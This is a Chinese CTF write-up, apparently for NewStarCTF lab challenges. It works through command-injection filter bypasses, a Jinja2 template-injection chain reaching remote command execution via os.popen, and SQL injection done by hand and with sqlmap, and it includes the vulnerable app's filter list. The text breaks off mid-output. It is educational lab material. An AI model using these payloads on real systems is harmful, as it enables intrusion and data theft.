<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26ca$9t%09fff??<span class="function"><span class="params">lllaaaaggggg</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">=&gt;</span> flag&#123;8585f43d-3a99-407a-af1f-64fcdbdf600d&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>过滤了”fl”与”*“，用通配符”?”绕过；</li>
<li>空格用 <code>%09</code> 或 <code>\$&#123;IFS&#125;</code> 或 <code>\$IFS\$9</code> </li>
<li>过滤字符用空字符连接绕过，<code>$9</code> 未被定义自动为空，连接在cat中间依然表示cat</li>
<li>根目录 <code>/</code> 被过滤用 <code>cd ..</code> 绕过</li>
<li><code>;</code> 被过滤，多命令顺序执行用 <code>&amp;&amp;</code> 绕过</li>
</ol>
<h3 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h3><p><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98788776" >Django入门 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><em>也许最简单的初始方法是通过注入模板表达式中常用的特殊字符序列来使模板模糊，例如 <code>$&#123;&#123;<%[%'"&#125;&#125;%\</code>。如果引发异常，则表明服务器可能以某种方式解释了注入的模板语法。这表明服务器端模板注入可能存在漏洞。</em></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">3</span>].__name__&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>枚举子类名称，过滤了双引号用单引号替代</p>
<p><code>a.__getattr__(&quot;b&quot;) == a.b == getattr(&quot;b&quot;)</code> </p>
<p><code>a.__sub__(4) == a[4]</code> </p>
<p><code>a.__class__ == a[&quot;__class__&quot;]</code> 目前只有在flask模板注入时发现该语句，在本地测试中py2与py3都不支持该语法，这更像是Js的对象读取。</p>
<p>利用burp爆破枚举子类，寻找有用的类，最终得到os函数：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27popen%<span class="number">27</span>).__name__&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>在子类中找到了”Quitter”，获取其构造函数后利用 <code>__globals__</code> 读取函数所在文件对应全局变量的值，读取时发现 <code>__builtins__</code> 中存在 <code>__import__</code> ，获取到该函数并导入 <code>os</code> 。由于 <code>system</code> 被过滤，利用模板渲染时python的语法解析特点，获取到system函数并实现RCE，但是 <code>system</code> 函数无法获取cmd返回值，且反弹shell由于存在空格惨遭过滤，因此改用 <code>os.popen().read()</code> 函数执行RCE：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27os%<span class="number">27</span>)[%27POPEN%<span class="number">27.</span>lower()](%27more%09/%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; app <span class="built_in">bin</span> boot dev etc flag_in_h3r3_52daad home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure></div>

<p>过滤的空格用 <code>%09</code> 或 <code>$&#123;IFS&#125;</code> 或 <code>$IFS$9</code> 绕过，cat被过滤用nl或more</p>
<p>爬取源码app.py：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template </span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;CTFer&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.findall(<span class="string">&#x27;class|init|mro|subclasses|flag|cat|env|&quot;|eval|system|popen|globals|builtins|\+| |attr|\~&#x27;</span>, name): </span><br><span class="line">        t = Template(<span class="string">&quot;Welcome to NewStarCTF Again, Dear &quot;</span> + name + <span class="string">&quot;Try to GET me a NAME&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> t.render() </span><br><span class="line">    <span class="keyword">else</span>: t = Template(<span class="string">&quot;Get Out!Hacker!&quot;</span>) </span><br><span class="line">    <span class="keyword">return</span> t.render() </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>

<p>“flag”惨遭过滤，用base64编码绕过：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ <span class="built_in">echo</span> <span class="string">&quot;cat /flag_in_h3r3_52daad&quot;</span> | <span class="built_in">base64</span></span><br><span class="line">Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg==</span><br></pre></td></tr></table></figure></div>

<p>payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="built_in">echo</span> \&#x27;Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg==\&#x27; | <span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure></div>

<p>得到EXP：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27os%<span class="number">27</span>)[%27POPEN%<span class="number">27.</span>lower()](%<span class="number">27</span>%60echo$&#123;IFS&#125;%5C%27Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg%3D%3D%5C%<span class="number">27</span>$&#123;IFS&#125;%7C$&#123;IFS&#125;base64$&#123;IFS&#125;-d%<span class="number">60</span>%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; flag&#123;48a07e3e-0a4b-444a-<span class="number">8010</span>-8de01a894d64&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于之前忽略了 <code>/</code> 导致以为通配符不行。实际上payload：<code>tail$&#123;IFS&#125;/fla*</code> 也可以，支持通配符</p>
<h3 id="又一个SQL"><a href="#又一个SQL" class="headerlink" title="又一个SQL"></a>又一个SQL</h3><h4 id="Insert注入"><a href="#Insert注入" class="headerlink" title="Insert注入"></a>Insert注入</h4><p>经测试可以使用 <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/131337894" >Insert注入与Sqlmap的Post注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>pyaload；</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">794</span><span class="string">&#x27; and if(ascii(substr(database(), 1, 1))&gt;65, sleep(4), 1) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>此处的and改成or会注入失败，可能是or后的语句没执行。该payload放在 <code>say.php</code> 中的任意一个框中提交都能注入成功，利用时间盲注即可获得数据库信息。</p>
<hr>
<p>手注太麻烦，试着用sqlmap来自动注入，由于此处是一个POST注入，可以使用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81/say.php --data=<span class="string">&quot;user=1&amp;name=1&amp;comment=1&quot;</span> -p <span class="string">&quot;user&quot;</span> --current-db --technique T --delay=0.1 --time-sec 3 --level=3 --risk=2</span><br></pre></td></tr></table></figure></div>

<p>​		<code>-u</code> 指定目标url，<code>--data</code> 指定post内容，<code>-p</code> 指定注入参数，<code>--current-db</code> 指定获取当前数据库信息，<code>--technique T</code> 指定使用时间盲注，<code>--delay=0.1</code> 指定发包间隔为0.1s，<code>time-sec 3</code> 指定时间盲注的延迟时间为3s，<code>--level=3</code> 指定注入等级为3，<code>--risk=2</code> 指定风险等级为2（高风险等级可以使用更具破坏性的payload，如与Update、Delete有关的），但是这个payload不论如何调整都注不出结果。<em>这可能是因为sqlmap的直接Post注入会漏掉一些请求</em>（补充：实际上是因为没加UA），结合Burp的包来注入能解决这个问题。</p>
<p>​		使用Burp抓取Post请求包并保存为Txt文本文件：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/say.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81/say.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">user</span>=<span class="number">123</span>&amp;name=<span class="number">123</span>&amp;comment=<span class="number">123</span></span></span><br></pre></td></tr></table></figure></div>

<p>使用 <code>-r</code> 参数指定sqlmap从文件中获取Http请求，payload如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -r package.txt --dbs</span><br></pre></td></tr></table></figure></div>

<p>sqlmap会确定如下注入点：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: name (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: user=123&amp;name=123<span class="string">&#x27; AND (SELECT 8459 FROM (SELECT(SLEEP(5)))lyAw) AND &#x27;</span>FPWb<span class="string">&#x27;=&#x27;</span>FPWb&amp;comment=123</span><br></pre></td></tr></table></figure></div>

<p><code>--dbs</code> 获取目标所有数据库名称，能够得到如下信息：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">web application technology: OpenResty</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line">...</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] wfy</span><br><span class="line">fetched data logged to text files under <span class="string">&#x27;/home/sam/.local/share/sqlmap/output/fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到四个数据库名称，依据newstar惯例，尝试获取wfy数据库的信息：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1</span><br><span class="line"></span><br><span class="line">-&gt; </span><br><span class="line">Database: wfy</span><br><span class="line">[3 tables]</span><br><span class="line">+-----------------+</span><br><span class="line">| wfy_admin       |</span><br><span class="line">| wfy_comments    |</span><br><span class="line">| wfy_information |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure></div>

<p>查看表 <code>wfy_comments</code> 的字段内容：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1 -T wfy_comments --columns</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">Database: wfy</span><br><span class="line">Table: wfy_comments</span><br><span class="line">[5 columns]</span><br><span class="line">+---------+--------------+</span><br><span class="line">| Column  | Type         |</span><br><span class="line">+---------+--------------+</span><br><span class="line">| name    | varchar(255) |</span><br><span class="line">| text    | text         |</span><br><span class="line">| user    | varchar(255) |</span><br><span class="line">| display | tinyint(1)   |</span><br><span class="line">| <span class="built_in">id</span>      | int(11)      |</span><br><span class="line">+---------+--------------+</span><br></pre></td></tr></table></figure></div>

<p>依据提示，flag应该藏在text中，且在 <code>user=f1ag_is_here</code> 处，dump表内容：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1 -T wfy_comments -C text --dump --<span class="built_in">where</span> <span class="string">&#x27;user=&quot;f1ag_is_here&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| text                           |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| flag&#123;We_0nly_have_2wo_choices&#125; |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>来自大佬WP的payload2：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#爆表名</span><br><span class="line">name<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(table_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.tables<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_schema<span class="operator">=</span>database()),<span class="number">2</span>;</span><br><span class="line">#爆列名</span><br><span class="line">name<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(column_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.columns<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_name<span class="operator">=</span><span class="string">&#x27;wfy_comments&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"># 爆字段</span><br><span class="line"><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(id,text,<span class="keyword">user</span>,name,display)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b0,<span class="number">1</span>),<span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>

<p>直接在查询中注入。过滤的是空格，用 <code>%0b</code> 绕过，这是竖直制表符”Vertical Tab”。关键词 <code>union, select, group_concat, from</code> 等等都没被过滤。通过联合查询注入即可取得flag。</p>
<p>自己尝试复现注入思路：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span>; # 拿不到数据库名</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(schema_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.schemata),<span class="number">2</span>; # 也拿不到数据库名</span><br></pre></td></tr></table></figure></div>

<p>上述payload是注入成功了（查询成功）但拿不到内容，原因是查询结果实际上是两行，只显示了第一行也就是本来的查询结果（虽然这里是空，因为库内的内容就是空），因此需要想办法获取到第二行的内容，有两种办法，一种是让第一行不见，如查询不存在的记录，把 <code>1</code> 改成 <code>-1</code> 或 <code>0</code> ；第二种是强行显示第二行的内容，加上 <code>limit%0b1,1</code> ：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span><span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b1,<span class="number">1</span>;</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span><span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b1,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> wfy</span><br></pre></td></tr></table></figure></div>

<p>同理注入表、字段内容即可：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 表名</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(table_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.tables<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_schema<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> wfy_admin,wfy_comments,wfy_information</span><br><span class="line"># 字段名</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(column_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.columns<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_name<span class="operator">=</span><span class="string">&#x27;wfy_comments&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> id,text,<span class="keyword">user</span>,name,display</span><br><span class="line"># flag</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>btext<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>bid<span class="operator">=</span><span class="string">&#x27;100&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> flag&#123;We_0nly_have_2wo_choices&#125;</span><br><span class="line"># 或者</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>btext<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>buser<span class="operator">=</span><span class="string">&#x27;f1ag_is_here&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> flag&#123;We_0nly_have_2wo_choices&#125;</span><br></pre></td></tr></table></figure></div>

<p>Union关键字执行的联合查询需要其后的查询结果与前面的主查询”等长”，即字段数量一样，尽管字段不同，但数量一样可以让两者规整地列在同一张表中。字段数量不同会导致查询失败，从web服务角度来讲也是”没查询到”或”查询失败”，因此需要测试主查询的字段数量。此处的name主查询只回显了一个发送人”user”，好像标题上还显示了一个查询”id”，但我们前面就知道这个查询id会被原样打回到前端，因此大概率不是查询的结果。在无法判断字段数量的情况下可以逐个添加无用字段尝试，直至查询成功，前提是你的查询语句本身没有错。另一种方式是利用关键字 <code>order by</code> 测试字段数量：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b1;	# 查询成功</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b2;	# 查询成功</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b3;	# 查询失败，说明只查了两个字段</span><br></pre></td></tr></table></figure></div>

<p>解出后回过头看这个sql查询，这里有一个误解，传入的参数虽然是name，但放在查询中它是id，因此这里可以确定为数字型参数，因此不用考虑引号，不过单引号并没有被过滤。</p>
<p>顺带一提，这里的注释符号虽然被过滤了，但是查询语句中直接用分号结束，语句后有多余的内容是不影响前面语句的正确运行的，因此在分号存在的情况下不需要注释符。（也有可能是数字型参数name后面本来就没东西了）</p>
<hr>
<p>试试sqlmap能不能解决这个联合注入。主要需要解决空白字符替换问题，手改脚本并调用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://afbf3b0a-165f-41d3-91c9-552f8f217462.node4.buuoj.cn:81/comments.php --data=<span class="string">&quot;name=1&quot;</span> --delay=0.1 --user-agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span> --tamper=space2special.py</span><br><span class="line"> --technique=U --flush-session -b -f --answers=<span class="string">&quot;reduce=n,keep=n&quot;</span></span><br><span class="line"> </span><br><span class="line">-&gt; web application technology: OpenResty</span><br><span class="line">back-end DBMS operating system: Linux Ubuntu</span><br><span class="line">back-end DBMS: active fingerprint: MySQL &gt;= 5.5</span><br><span class="line">               comment injection fingerprint: MySQL 5.6.52</span><br><span class="line">               banner parsing 